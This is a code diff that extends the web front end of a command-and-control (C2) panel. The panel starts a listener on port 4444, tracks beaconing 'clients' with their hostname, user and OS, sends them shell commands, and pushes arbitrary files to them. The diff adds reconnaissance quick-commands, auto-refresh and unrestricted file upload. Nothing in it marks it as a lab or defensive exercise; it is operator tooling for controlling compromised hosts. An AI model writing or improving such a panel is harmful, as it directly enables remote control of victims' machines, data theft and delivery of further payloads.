@@ -7,7 +7,7 @@
     <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
     <style>
         body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
-        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .container { max-width: 1000px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
         .section { margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
         button { background: #007acc; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; margin: 5px; }
         button:hover { background: #005a9e; }
@@ -17,7 +17,14 @@
         .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
         .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
         .client-list { list-style: none; padding: 0; }
-        .client-list li { padding: 5px; margin: 2px 0; background: #f8f9fa; border-radius: 3px; }
+        .client-item { padding: 10px; margin: 5px 0; background: #f8f9fa; border-radius: 3px; border-left: 4px solid #007acc; }
+        .client-info { font-size: 0.9em; color: #666; margin-top: 5px; }
+        .client-id { font-weight: bold; color: #333; }
+        .client-ip { color: #007acc; }
+        .client-status { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 5px; }
+        .online { background: #28a745; }
+        .offline { background: #dc3545; }
+        .command-output { background: #1e1e1e; color: #00ff00; padding: 10px; border-radius: 4px; font-family: monospace; margin: 10px 0; max-height: 200px; overflow-y: auto; }
     </style>
 </head>
 <body>
@@ -30,6 +37,8 @@
             const [selectedClient, setSelectedClient] = React.useState('');
             const [command, setCommand] = React.useState('');
             const [selectedFile, setSelectedFile] = React.useState(null);
+            const [clientInfo, setClientInfo] = React.useState(null);
+            const [commandOutput, setCommandOutput] = React.useState('');
             
             const startListener = async () => {
                 try {
@@ -51,10 +60,21 @@
                     const data = await result.json();
                     setClients(data);
                     if (data.length > 0 && !selectedClient) {
-                        setSelectedClient(data[0]);
+                        setSelectedClient(data[0].IPAddress);
                     }
                 } catch (error) {
                     console.error('Error fetching clients:', error);
+                }
+            };
+            
+            const getClientInfo = async (clientIP) => {
+                try {
+                    const result = await fetch(`http://localhost:8080/get-client-info?client=${clientIP}`);
+                    const data = await result.json();
+                    setClientInfo(data);
+                } catch (error) {
+                    console.error('Error fetching client info:', error);
+                    setClientInfo(null);
                 }
             };
             
@@ -73,6 +93,11 @@
                     const data = await result.json();
                     setStatus(data.status);
                     setCommand('');
+                    
+                    // Simulate command output (in real implementation, this would come from server)
+                    setTimeout(() => {
+                        setCommandOutput(`Command sent: ${command}\nWaiting for response from client...`);
+                    }, 1000);
                 } catch (error) {
                     setStatus('Error: ' + error.message);
                 }
@@ -103,76 +128,140 @@
                 setSelectedFile(event.target.files[0]);
             };
             
+            const handleClientSelect = (clientIP) => {
+                setSelectedClient(clientIP);
+                getClientInfo(clientIP);
+            };
+            
             const getStatusClass = () => {
                 if (status.includes('✅') || status.includes('Listener started')) return 'success';
                 if (status.includes('❌') || status.includes('Error')) return 'error';
                 return '';
             };
             
+            const formatLastSeen = (lastSeen) => {
+                if (!lastSeen) return 'Unknown';
+                const date = new Date(lastSeen);
+                return date.toLocaleString();
+            };
+            
+            // Auto-refresh clients every 5 seconds
+            React.useEffect(() => {
+                refreshClients();
+                const interval = setInterval(refreshClients, 5000);
+                return () => clearInterval(interval);
+            }, []);
+            
             return (
                 <div className="container">
-                    <h1>🖥️ C2 Controller</h1>
+                    <h1>🖥️ Advanced C2 Controller</h1>
                     
                     <div className="section">
-                        <button onClick={startListener}>Start Listener on Port 4444</button>
+                        <button onClick={startListener}>Start C2 Listener on Port 4444</button>
+                        <button onClick={refreshClients}>Refresh Clients</button>
                     </div>
                     
                     <div className="section">
-                        <button onClick={refreshClients}>Refresh Clients</button>
-                        <h3>Connected Clients:</h3>
+                        <h3>🔗 Connected Clients:</h3>
                         {clients.length === 0 ? (
-                            <p>No clients connected</p>
+                            <p>No clients connected. Start listener and wait for beacons...</p>
                         ) : (
-                            <ul className="client-list">
+                            <div className="client-list">
                                 {clients.map(client => (
-                                    <li key={client}>{client}</li>
+                                    <div key={client.IPAddress} className="client-item">
+                                        <div>
+                                            <span className="client-status online"></span>
+                                            <span className="client-id">{client.ID}</span>
+                                            <span className="client-ip"> ({client.IPAddress})</span>
+                                        </div>
+                                        <div className="client-info">
+                                            Last seen: {formatLastSeen(client.LastSeen)}
+                                            {client.SystemInfo && client.SystemInfo.Hostname && (
+                                                <div>
+                                                    System: {client.SystemInfo.Hostname} | 
+                                                    User: {client.SystemInfo.User} | 
+                                                    OS: {client.SystemInfo.OS} {client.SystemInfo.Arch}
+                                                </div>
+                                            )}
+                                        </div>
+                                        <button 
+                                            onClick={() => handleClientSelect(client.IPAddress)}
+                                            style={{fontSize: '0.8em', padding: '4px 8px'}}
+                                        >
+                                            Select
+                                        </button>
+                                    </div>
                                 ))}
-                            </ul>
+                            </div>
                         )}
                     </div>
+                    
+                    {selectedClient && (
+                        <div className="section">
+                            <h3>🎯 Selected Client: {selectedClient}</h3>
+                            {clientInfo && (
+                                <div style={{background: '#f8f9fa', padding: '10px', borderRadius: '4px'}}>
+                                    <strong>System Information:</strong>
+                                    <div>Hostname: {clientInfo.Hostname || 'Unknown'}</div>
+                                    <div>User: {clientInfo.User || 'Unknown'}</div>
+                                    <div>OS: {clientInfo.OS || 'Unknown'} {clientInfo.Arch || ''}</div>
+                                </div>
+                            )}
+                        </div>
+                    )}
                     
                     <div className="section">
                         <h3>📝 Send Command:</h3>
                         <select 
                             value={selectedClient} 
-                            onChange={(e) => setSelectedClient(e.target.value)}
+                            onChange={(e) => handleClientSelect(e.target.value)}
                         >
                             <option value="">Select Client</option>
                             {clients.map(client => (
-                                <option key={client} value={client}>{client}</option>
+                                <option key={client.IPAddress} value={client.IPAddress}>
+                                    {client.ID} ({client.IPAddress})
+                                </option>
                             ))}
                         </select>
                         <input 
                             type="text" 
                             value={command}
                             onChange={(e) => setCommand(e.target.value)}
-                            placeholder="Enter command"
+                            placeholder="Enter command (e.g., whoami, ipconfig, dir)"
                             style={{width: '300px'}}
+                            onKeyPress={(e) => e.key === 'Enter' && sendCommand()}
                         />
                         <button onClick={sendCommand} disabled={!selectedClient || !command}>
                             Send Command
                         </button>
+                        
+                        {commandOutput && (
+                            <div className="command-output">
+                                {commandOutput}
+                            </div>
+                        )}
                     </div>
                     
                     <div className="section">
-                        <h3>📦 Send Binary File:</h3>
+                        <h3>📦 Send Binary/File:</h3>
                         <select 
                             value={selectedClient} 
-                            onChange={(e) => setSelectedClient(e.target.value)}
+                            onChange={(e) => handleClientSelect(e.target.value)}
                         >
                             <option value="">Select Client</option>
                             {clients.map(client => (
-                                <option key={client} value={client}>{client}</option>
+                                <option key={client.IPAddress} value={client.IPAddress}>
+                                    {client.ID} ({client.IPAddress})
+                                </option>
                             ))}
                         </select>
                         <input 
                             id="binary-input"
                             type="file" 
-                            accept=".bin" 
                             onChange={handleFileSelect}
                         />
                         <button onClick={sendBinary} disabled={!selectedClient || !selectedFile}>
-                            Send Binary
+                            Send File
                         </button>
                         {selectedFile && (
                             <div style={{marginTop: '10px'}}>
@@ -180,6 +269,15 @@
                                 ({(selectedFile.size / 1024).toFixed(2)} KB)
                             </div>
                         )}
+                    </div>
+                    
+                    <div className="section">
+                        <h3>⚡ Quick Commands:</h3>
+                        <button onClick={() => setCommand('whoami')}>whoami</button>
+                        <button onClick={() => setCommand('ipconfig')}>ipconfig</button>
+                        <button onClick={() => setCommand('systeminfo')}>systeminfo</button>
+                        <button onClick={() => setCommand('dir')}>dir</button>
+                        <button onClick={() => setCommand('netstat -an')}>netstat</button>
                     </div>
                     
                     {status && (
